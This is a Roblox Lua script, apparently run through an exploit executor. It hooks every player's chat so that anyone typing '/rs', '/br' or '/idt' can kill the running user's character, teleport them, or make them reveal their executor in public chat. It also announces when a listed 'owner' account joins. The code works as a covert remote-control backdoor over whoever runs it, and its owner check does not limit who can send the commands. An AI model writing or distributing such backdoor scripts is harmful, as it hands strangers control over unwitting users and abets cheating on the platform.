-- Script Control --
local ws, plrs, reps, rs, txs
ws = game:GetService("Workspace")
plrs = game:GetService("Players")
reps = game:GetService("ReplicatedStorage")
rs = game:GetService("RunService")
txs = game:GetService("TextChatService")

local vars, plr
vars = {
  chatv = txs.ChatVersion == Enum.ChatVersion.LegacyChatService,
  s_cal = false, prefix = "/",
  owners = {"bloxfruits_devs09"}
}
plr = plrs.LocalPlayer

function ntfc(m)
  m = tostring(m)
  if not vars.chatv then
    txs.TextChannels.RBXGeneral:SendAsync(m)
  else
    reps.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(m, "All")
  end
end

function str_check(x, t, n)
  if not x or not x.Name then return false end
  local lname = tostring(x.Name):lower()
  if table.find(vars.owners, lname) and x.DisplayName then
    ntfc("<Roger: "..x.DisplayName:sub(1, 4).."...>")
  end
  return t == vars.prefix..n
end

function rcv_hrp(t)
  return t and t.Character and t.Character:FindFirstChild("HumanoidRootPart")
end

function rcv_hmoid(t)
  return t and t.Character and t.Character:FindFirstChildOfClass("Humanoid")
end

function t_alive(t)
  return t and rcv_hmoid(t) and rcv_hmoid(t).Health > 0
end

function nearby_t()
  local t = {n = nil, m = math.huge, h = rcv_hrp(plr)}
  for _, near in pairs(plrs:GetPlayers()) do
    if t.h and near and rcv_hrp(near) then
      local d = (rcv_hrp(near).Position - t.h.Position).magnitude
      if d < t.m then
        t.m = d
        t.n = near
      end
    end
  end
  return t.n
end

function do_cmd(sender, msg)
  -- sender: player who sent the chat, msg: first token of the message
  local info = {hrp = rcv_hrp(sender), hmoid = rcv_hmoid(sender), alive = t_alive(sender)}
  local s = {hrp = rcv_hrp(plr), hmoid = rcv_hmoid(plr), alive = t_alive(plr)}

  -- if local player is listed as owner, ignore processing
  if table.find(vars.owners, tostring(plr.Name):lower()) then return end

  if str_check(sender, msg, "rs") then
    if s.hmoid and s.alive then s.hmoid.Health = 0 end
  elseif str_check(sender, msg, "br") then
    if s.hrp and s.alive and info.hrp and info.alive then
      s.hrp.CFrame = CFrame.new(info.hrp.Position + (info.hrp.CFrame.LookVector * 5))
    end
  elseif str_check(sender, msg, "idt") then
    if identifyexecutor then ntfc(tostring(identifyexecutor())) else ntfc("api doesn't exist...") end
  elseif str_check(sender, msg, "cmds") then
    ntfc("prefix:\""..vars.prefix.."\", rs, br, idt, cmds")
  end
end

function do_connect(player)
  if not player then return end
  player.Chatted:Connect(function(message)
    local parts = tostring(message):split(" ")
    do_cmd(player, parts[1])
  end)
end

for _, user in next, plrs:GetPlayers() do
  if user then
    do_connect(user)
    if user.Name and table.find(vars.owners, user.Name:lower()) then
      ntfc("[!]: "..(user.DisplayName or user.Name).." is here.")
    end
  end
end

plrs.PlayerAdded:Connect(function(player)
  if player then
    do_connect(player)
    if player.Name and table.find(vars.owners, player.Name:lower()) then
      ntfc("[!]: "..(player.DisplayName or player.Name).." has joined the server.")
    end
  end
end)
